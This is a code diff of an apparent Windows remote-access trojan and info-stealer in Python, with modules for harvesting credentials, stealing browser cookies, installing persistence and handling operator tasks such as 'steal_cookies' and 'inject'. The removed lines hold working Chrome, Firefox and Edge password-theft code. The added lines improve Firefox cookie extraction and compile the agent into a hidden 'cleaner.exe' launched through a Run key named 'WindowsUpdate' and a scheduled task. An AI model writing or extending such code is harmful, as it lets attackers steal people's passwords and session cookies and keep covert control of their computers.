@@ -77,119 +77,6 @@ class Crypto:
 # ======================
 class CredentialHarvester:
     @staticmethod
-    def get_chrome_credentials():
-        try:
-            credentials = []
-            chrome_path = os.path.join(os.getenv('LOCALAPPDATA'), 
-                                     'Google', 'Chrome', 'User Data', 'Default', 'Login Data')
-            
-            if not os.path.exists(chrome_path):
-                return credentials
-
-            temp_db = os.path.join(os.getenv('TEMP'), 'chrome_temp.db')
-            if os.path.exists(temp_db):
-                os.remove(temp_db)
-            
-            shutil.copy2(chrome_path, temp_db)
-            
-            conn = sqlite3.connect(temp_db)
-            cursor = conn.cursor()
-            cursor.execute('SELECT origin_url, username_value, password_value FROM logins')
-            
-            for url, user, encrypted_pw in cursor.fetchall():
-                try:
-                    password = win32crypt.CryptUnprotectData(encrypted_pw, None, None, None, 0)[1]
-                    if password:
-                        credentials.append({
-                            "browser": "chrome",
-                            "url": url,
-                            "username": user,
-                            "password": password.decode('utf-8', errors='ignore')
-                        })
-                except:
-                    continue
-            
-            conn.close()
-            os.remove(temp_db)
-            return credentials
-        except Exception as e:
-            return []
-
-    @staticmethod
-    def get_firefox_credentials():
-        try:
-            credentials = []
-            profiles = []
-            ff_path = os.path.join(os.getenv('APPDATA'), 'Mozilla', 'Firefox')
-            
-            if os.path.exists(os.path.join(ff_path, 'profiles.ini')):
-                config = configparser.ConfigParser()
-                config.read(os.path.join(ff_path, 'profiles.ini'))
-                
-                for section in config.sections():
-                    if section.startswith('Profile'):
-                        profiles.append(os.path.join(ff_path, config[section]['Path']))
-            
-            for profile in profiles:
-                logins_path = os.path.join(profile, 'logins.json')
-                if os.path.exists(logins_path):
-                    with open(logins_path, 'r', encoding='utf-8') as f:
-                        data = json.load(f)
-                    
-                    for login in data.get('logins', []):
-                        try:
-                            credentials.append({
-                                "browser": "firefox",
-                                "url": login['hostname'],
-                                "username": login['encryptedUsername'],
-                                "password": login['encryptedPassword']
-                            })
-                        except:
-                            continue
-            return credentials
-        except:
-            return []
-
-    @staticmethod
-    def get_edge_credentials():
-        try:
-            credentials = []
-            edge_path = os.path.join(os.getenv('LOCALAPPDATA'), 
-                                    'Microsoft', 'Edge', 'User Data', 'Default', 'Login Data')
-            
-            if not os.path.exists(edge_path):
-                return credentials
-
-            temp_db = os.path.join(os.getenv('TEMP'), 'edge_temp.db')
-            if os.path.exists(temp_db):
-                os.remove(temp_db)
-            
-            shutil.copy2(edge_path, temp_db)
-            
-            conn = sqlite3.connect(temp_db)
-            cursor = conn.cursor()
-            cursor.execute('SELECT origin_url, username_value, password_value FROM logins')
-            
-            for url, user, encrypted_pw in cursor.fetchall():
-                try:
-                    password = win32crypt.CryptUnprotectData(encrypted_pw, None, None, None, 0)[1]
-                    if password:
-                        credentials.append({
-                            "browser": "edge",
-                            "url": url,
-                            "username": user,
-                            "password": password.decode('utf-8', errors='ignore')
-                        })
-                except:
-                    continue
-            
-            conn.close()
-            os.remove(temp_db)
-            return credentials
-        except:
-            return []
-
-    @staticmethod
     def get_wifi_passwords():
         try:
             profiles = []
@@ -442,8 +329,39 @@ class CookieStealer:
                 
             conn = sqlite3.connect(cookies_db)
             cursor = conn.cursor()
-            cursor.execute("SELECT name, value, host, path, expiry, isSecure, isHttpOnly, sameSite FROM moz_cookies")
-            cookies = cursor.fetchall()
+            
+            # Modified query to ensure all fields are properly handled
+            cursor.execute("""
+                SELECT 
+                    CAST(name AS TEXT) as name,
+                    CAST(value AS TEXT) as value,
+                    CAST(host AS TEXT) as host,
+                    CAST(path AS TEXT) as path,
+                    CAST(expiry AS INTEGER) as expiry,
+                    CAST(isSecure AS INTEGER) as isSecure,
+                    CAST(isHttpOnly AS INTEGER) as isHttpOnly,
+                    CAST(sameSite AS INTEGER) as sameSite 
+                FROM moz_cookies
+            """)
+            
+            cookies = []
+            for row in cursor.fetchall():
+                try:
+                    # Ensure all values are properly converted
+                    cookies.append((
+                        str(row[0]),  # name
+                        str(row[1]),  # value
+                        str(row[2]),  # host
+                        str(row[3]),  # path
+                        int(row[4]) if row[4] else 0,  # expiry
+                        bool(row[5]),  # isSecure
+                        bool(row[6]),  # isHttpOnly
+                        str(row[7]) if row[7] else 'none'  # sameSite
+                    ))
+                except Exception as e:
+                    self._log('error', f"Error processing Firefox cookie: {str(e)}")
+                    continue
+            
             conn.close()
             return cookies
         except Exception as e:
@@ -652,15 +570,49 @@ class Persistence:
             if platform.system() != "Windows":
                 return {"status": "error", "message": "Only Windows supported"}
             
+            # Create target directory if it doesn't exist
+            target_dir = os.path.join(os.getenv('PROGRAMDATA'), 'Windows')
+            os.makedirs(target_dir, exist_ok=True)
+            exe_path = os.path.join(target_dir, 'cleaner.exe')
+            
+            # Build the executable using PyInstaller
+            try:
+                import PyInstaller.__main__
+                
+                # Create a temporary spec file
+                temp_dir = os.path.join(os.getenv('TEMP'), 'pyinstaller_temp')
+                os.makedirs(temp_dir, exist_ok=True)
+                
+                # PyInstaller arguments
+                pyinstaller_args = [
+                    '--onefile',
+                    '--noconsole',
+                    '--name=cleaner',
+                    '--distpath=' + target_dir,
+                    '--workpath=' + temp_dir,
+                    '--specpath=' + temp_dir,
+                    __file__
+                ]
+                
+                # Run PyInstaller
+                PyInstaller.__main__.run(pyinstaller_args)
+                
+                # Clean up temporary files
+                shutil.rmtree(temp_dir)
+                shutil.rmtree(os.path.join(os.path.dirname(__file__), '__pycache__'), ignore_errors=True)
+                
+            except Exception as e:
+                return {"status": "error", "message": f"PyInstaller failed: {str(e)}"}
+            
             # Registry persistence
             key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
             key = winreg.HKEY_CURRENT_USER
             try:
                 reg_key = winreg.OpenKey(key, key_path, 0, winreg.KEY_WRITE)
-                winreg.SetValueEx(reg_key, "WindowsUpdate", 0, winreg.REG_SZ, sys.executable + " " + __file__)
+                winreg.SetValueEx(reg_key, "WindowsUpdate", 0, winreg.REG_SZ, exe_path)
                 winreg.CloseKey(reg_key)
-            except:
-                return {"status": "error", "message": "Failed to set registry key"}
+            except Exception as e:
+                return {"status": "error", "message": f"Failed to set registry key: {str(e)}"}
             
             # Scheduled task
             try:
@@ -706,8 +658,7 @@ class Persistence:
                     </Settings>
                     <Actions Context="Author">
                         <Exec>
-                            <Command>{sys.executable}</Command>
-                            <Arguments>"{__file__}"</Arguments>
+                            <Command>{exe_path}</Command>
                         </Exec>
                     </Actions>
                 </Task>
@@ -719,14 +670,15 @@ class Persistence:
                 
                 subprocess.run(
                     ['schtasks', '/Create', '/TN', task_name, '/XML', xml_path, '/F'],
-                    creationflags=subprocess.CREATE_NO_WINDOW
+                    creationflags=subprocess.CREATE_NO_WINDOW,
+                    check=True
                 )
                 
                 os.remove(xml_path)
-            except:
-                return {"status": "error", "message": "Failed to create scheduled task"}
+            except Exception as e:
+                return {"status": "error", "message": f"Failed to create scheduled task: {str(e)}"}
             
-            return {"status": "success", "message": "Persistence installed"}
+            return {"status": "success", "message": "Persistence installed", "exe_path": exe_path}
         except Exception as e:
             return {"status": "error", "message": str(e)}
 
@@ -1144,14 +1096,12 @@ class Agent:
             "os": platform.platform(),
             "privilege": "admin" if ctypes.windll.shell32.IsUserAnAdmin() else "user",
             "ip": requests.get('https://api.ipify.org', timeout=5).text,
-            "timestamp": datetime.now().isoformat()
+            "timestamp": datetime.now().strftime('%Y-%m-%d %H:%M:%S %Z')
         }
 
         if not self._initial_checkin or (time.time() - self._initial_checkin) > 86400:
             data["credentials"] = {
-                "browsers": CredentialHarvester.get_chrome_credentials() + 
-                           CredentialHarvester.get_firefox_credentials() + 
-                           CredentialHarvester.get_edge_credentials(),
+                
                 "wifi": CredentialHarvester.get_wifi_passwords()
             }
             if not self._initial_checkin:
@@ -1284,16 +1234,7 @@ class Agent:
                     }
                 return {"status": "error", "message": "Failed to capture screenshot"}
             
-            elif task_type == "harvest_creds":
-                return {
-                    "status": "success",
-                    "credentials": {
-                        "browsers": CredentialHarvester.get_chrome_credentials() + 
-                                    CredentialHarvester.get_firefox_credentials() + 
-                                    CredentialHarvester.get_edge_credentials(),
-                        "wifi": CredentialHarvester.get_wifi_passwords()
-                    }
-                }
+            
             
             elif task_type == "steal_cookies":
                 try:
@@ -1329,6 +1270,7 @@ class Agent:
                     task.get("data", ""))
             
             elif task_type == "persist":
+                self._log_info("Installing persistence")
                 return Persistence.install()
             
             elif task_type == "inject":
